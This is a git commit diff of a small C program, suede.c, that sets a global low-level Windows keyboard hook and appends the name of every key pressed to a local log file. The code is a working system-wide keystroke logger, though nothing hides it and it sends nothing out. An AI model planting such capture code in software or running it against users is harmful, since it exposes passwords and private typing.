2c4b2288894a8d19b57e7effc404f48ed64c823f
Steven Penny <svnpenn@gmail.com>
2014-10-04 20:44:37 -0500

    LRESULT KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {

--- suede.c
+++ suede.c
@@ -2,29 +2,26 @@
 #include <windows.h>
 HHOOK hKeyHook;
 
-__declspec(dllexport) LRESULT CALLBACK
-KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
-  if (
-    (nCode == HC_ACTION) &&
-    ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
-  ) {
-    KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
-    DWORD mesg = 1;
-    mesg += hooked->scanCode << 16;
-    mesg += hooked->flags << 24;
-    char kn[] = "Windows Right";
-    GetKeyNameText(mesg, kn, sizeof kn);
-    FILE * fpt = fopen("suede.log", "a");
-    fprintf(fpt, "_%s", kn);
-    fflush(fpt);
+LRESULT KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
+  KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
+  DWORD mesg = 1;
+  switch (wParam) {
+    case WM_KEYDOWN:
+    case WM_SYSKEYDOWN:
+      mesg += hooked->scanCode << 16;
+      mesg += hooked->flags << 24;
+      char kn[] = "Windows Right";
+      GetKeyNameText(mesg, kn, sizeof kn);
+      FILE * fpt = fopen("suede.log", "a");
+      fprintf(fpt, "_%s", kn);
+      fflush(fpt);
   }
   return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
 
 int main() {
-  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, 0);
+  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, 0, 0);
   while (1) {
     GetMessage(0, 0, 0, 0);
   }
-  return 0;
 }
